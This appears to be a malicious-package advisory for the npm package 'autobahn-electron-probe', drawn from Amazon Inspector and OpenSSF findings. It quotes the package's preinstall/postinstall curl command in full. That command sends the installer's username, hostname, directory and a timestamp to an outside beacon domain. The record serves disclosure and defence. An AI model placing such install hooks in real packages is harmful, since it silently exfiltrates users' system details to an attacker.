## Source: amazon-inspector (12dc0a5dd6ee92d1530068fa541791305711fad5f9b206ebee22b22f164692a5)
package.json declares both preinstall and postinstall lifecycle scripts that run curl against a DNS-beacon-style subdomain, transmitting the installer's username, hostname, current working directory, and a timestamp as URL query parameters over plain HTTP: `curl -s "http://da9nu7avbsgtvoua4om0746ibn3suot7h.cyowl.com/autobahn-electron-probe/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)"`. The scripts fire automatically on `npm install`. The remaining shipped content is an inert placeholder; the manifest lifecycle hooks are the entire payload. The destination subdomain is unrelated to any legitimate publisher and follows a DNS-exfiltration beacon pattern.

## Source: ossf-package-analysis (d3c07ff64c9729469df8453fb5fd6fa15e1099e81916496d741fe10297e44fc7)
The OpenSSF Package Analysis project identified 'autobahn-electron-probe' @ 99.99.1 (npm) as malicious.

It is considered malicious because:

- The package executes one or more commands associated with malicious behavior.
